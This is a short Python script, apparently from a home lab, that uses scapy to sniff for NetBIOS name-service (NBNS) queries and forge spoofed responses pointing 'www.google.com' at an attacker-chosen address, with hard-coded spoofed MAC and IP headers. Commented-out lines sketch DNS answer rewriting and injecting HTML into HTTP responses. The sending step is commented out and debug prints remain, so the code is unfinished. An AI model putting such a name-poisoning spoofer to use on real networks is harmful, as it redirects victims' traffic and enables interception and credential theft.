from scapy.all import * 

def processPkt(packet):
    print("yes2")
    print(packet.show())
    scapyPkt = packet #IP(packet.get_payload())
    if scapyPkt.haslayer(NBNSQueryRequest):
        print("yes3")
        print("Before ", scapyPkt.summary())
        print(scapyPkt.show())
        try:
	        scapyPkt = modifyPkt(scapyPkt)
        except IndexError:
            print("Error")
            pass
        print("After ", scapyPkt.summary())
        #packet.set_payload(bytes(scapyPkt))
    #packet.accept()
    #sendp(packet, loop = 1, verbose = 2)

def modifyPkt(packet):
    print(packet)
    etherL = Ether(dst = "08:00:27:b7:c4:af", src = "08:00:27:D0:25:4B")
    ipL = IP(src = "192.168.56.103", dst = "192.168.56.101")
    udpL = UDP(sport = "netbios_ns", dport = "netbios_ns")
    nbnsResL = NBNSQueryResponse(RR_NAME = "www.google.com", NB_ADDRESS ="192.168.56.102")
    packet = etherL / ipL / udpL / nbnsResL
    print(packet.show())
    #dnsname = packet[HTTPResponse].payload
    #packet[HTTPResponse].payload = '<html><body><h1>It does not work!</h1></body></html>'
    
    #if dnsname not in dns_hosts:
	  #  print("no modification", dnsname)
	   # return packet
    #packet[DNS].an = DNSRR(rrname=dnsname, rdata = dns_hosts[dnsname])
    #packet[DNS].ancount = 1 #???
    #del packet[IP].len
    #del packet[IP].chsum
    #del packet[UDP].len    
    #del packet[UDP].chksum
    
    return packet

#"port 137"
try:
    sniff(prn = processPkt, lfilter = lambda pkt: pkt.haslayer(NBNSQueryRequest), iface = "enp0s3")
except KeyboardInterrupt:
    print("END")
